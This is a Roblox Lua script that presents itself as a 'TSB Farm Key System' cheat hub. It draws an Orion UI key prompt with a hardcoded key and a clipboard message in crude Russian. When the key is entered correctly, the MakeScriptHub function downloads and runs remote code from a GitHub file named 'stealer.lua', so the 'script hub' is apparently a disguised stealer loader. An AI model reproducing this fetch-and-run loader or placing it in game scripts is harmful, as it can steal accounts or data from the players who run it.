local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))() --This Will Load The Script Code
local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({
	Name = "TSB Farm Key System",
	HidePremium = false,
	SaveConfig = true,
	ConfigFolder = "TSBFarm",
	IntroText = "Loading Script..."       
}) --This Will Load The Script Hub

function MakeScriptHub()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zedikik/stealerTest/refs/heads/main/stealer.lua", true))()
end

OrionLib:MakeNotification({
	Name = "Logged In!",
	Content = "You need key "..Player.Name..".",
	Image = "rbxassetid://4483345998",
	Time = 5
}) --Notification

_G.Key = "IaZaGitlira_ZZZZ_ZOV" --Put The Correct Key Here
_G.KeyInput = "string" --Require For The Key To Work

local Tab = Window:MakeTab({
	Name = "Key",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
}) --Making A Tab

Tab:AddTextbox({
	Name = "Key",
	Default = "Enter Key",
	TextDisappear = true,
	Callback = function(Value)
		_G.KeyInput = Value
	end	  
}) --You Will Enter The Key Here

Tab:AddButton({
	Name = "Check Key",
	Callback = function()
		if _G.KeyInput == _G.Key then
			OrionLib:MakeNotification({
				Name = "Checking Key",
				Content = "Checking The Key You Entered",
				Image = "rbxassetid://4483345998",
				Time = 5
			})
			wait(2)
			OrionLib:MakeNotification({
				Name = "Correct Key!",
				Content = "The key you entered is Correct.",
				Image = "rbxassetid://4483345998",
				Time = 5
			})
			wait(1)
			OrionLib:Destroy()
			wait(.3)
			MakeScriptHub()
		else
			OrionLib:MakeNotification({
				Name = "Checking Key",
				Content = "Checking The Key You Entered",
				Image = "rbxassetid://4483345998",
				Time = 5
			})
			wait(2)
			OrionLib:MakeNotification({
				Name = "Incorrect Key!",
				Content = "The key you entered is incorrect.",
				Image = "rbxassetid://4483345998",
				Time = 5
			})
		end
	end
}) --This Will Check The Key You Entered

Tab:AddButton({
	Name = "Copy Key Link",
	Callback = function()
		local keyStr = "Скуфчик блять, вот твой ключ: ".._G.Key
		setclipboard(keyStr)
	end    
}) 

OrionLib:Init()
